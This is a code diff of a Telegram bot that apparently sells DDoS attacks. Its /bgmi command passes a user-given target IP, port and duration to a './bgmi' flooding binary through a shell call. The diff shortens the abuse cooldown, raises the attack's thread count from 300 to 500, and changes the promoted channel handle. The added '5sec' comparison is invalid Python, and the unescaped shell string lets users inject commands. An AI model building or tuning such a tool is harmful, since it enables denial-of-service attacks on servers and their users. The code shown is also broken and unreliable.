@@ -486,8 +486,8 @@ def handle_bgmi(message):
         # Join :- @Shubam_chitty # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Join :- @Shubam_chitty # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 120:
-                response = "You Are On Cooldown . Please Wait 2min Before Running The /bgmi Command Again."
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 5sec:
+                response = "You Are On Cooldown . Please Wait 5sec Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
             # Join :- @Shubam_chitty # Update the last time the user ran the command
@@ -504,7 +504,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Join :- @Shubam_chitty # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 300"
+                full_command = f"./bgmi {target} {port} {time} 500"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
@@ -565,7 +565,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
 🤖Try To Run This Command : /help 
-✅Join :- By @R2RHACKSOffICIAL'''
+✅Join :- By @MdNabazish'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
